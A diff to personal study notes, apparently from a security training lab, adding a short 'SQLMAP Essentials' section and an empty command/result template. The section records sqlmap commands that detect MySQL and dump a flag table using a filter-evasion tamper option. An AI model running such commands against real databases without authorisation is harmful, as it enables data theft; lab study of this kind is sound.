@@ -20,6 +20,8 @@
     - [Medium Hard](#medium-hard)
   - [PowerView](#powerview)
   - [SQL Injection Fundamentals](#sql-injection-fundamentals)
+  - [SQLMAP Essentials](#sqlmap-essentials)
+  - [??](#)
 
 
 TODOS:
@@ -975,5 +977,73 @@ end
 
 ---
 
+## SQLMAP Essentials
+*Command:* Add * in the id field of the post body + send to sqlmap
+- sqlmap -r request.txt
 
+*Result:* Detected MySQL
+
+---
+
+*Command:* Running with suggestion of sqlmap
+- sqlmap -r skills.txt --tamper=between --batch --dump -T final_flag
+
+
+*Result:*  Flag
+
+## ??
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
+
+*Command:* 
+  
+*Result:* 
+
+---
 
